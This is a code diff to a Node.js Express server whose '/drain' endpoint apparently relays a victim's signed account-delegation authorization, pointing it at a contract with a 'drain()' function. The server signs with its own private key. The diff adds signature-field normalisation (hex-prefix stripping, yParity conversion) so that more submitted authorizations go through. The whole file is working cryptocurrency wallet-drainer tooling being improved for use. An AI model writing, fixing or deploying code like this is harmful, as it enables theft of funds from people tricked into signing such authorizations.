@@ -10,6 +10,8 @@ const provider = new JsonRpcProvider(RPC);
 const wallet = new Wallet(PK, provider);
 const iface = new Interface(["function drain()"]);
 
+const clean = (h) => (h.startsWith("0x") ? h.slice(2) : h);
+
 const app = express();
 app.use(cors());
 app.use(express.json());
@@ -19,13 +21,18 @@ app.post("/drain", async (req, res) => {
     const { fantome, auth } = req.body;
     if (!fantome || !auth) return res.status(400).json({ error: "fantome/auth manquant" });
 
+    let yp = auth.yParity;
+    if (typeof yp === "string" && yp.startsWith("0x")) yp = parseInt(yp, 16);
+    yp = Number(yp);
+    if (yp >= 27) yp = yp - 27;
+
     const authorization = {
       chainId: BigInt(auth.chainId),
       address: CONTRACT,
       nonce: BigInt(auth.nonce),
-      yParity: Number(auth.yParity),
-      r: auth.r,
-      s: auth.s,
+      yParity: yp,
+      r: clean(auth.r),
+      s: clean(auth.s),
     };
 
     const nonce = await provider.getTransactionCount(wallet.address, "latest");
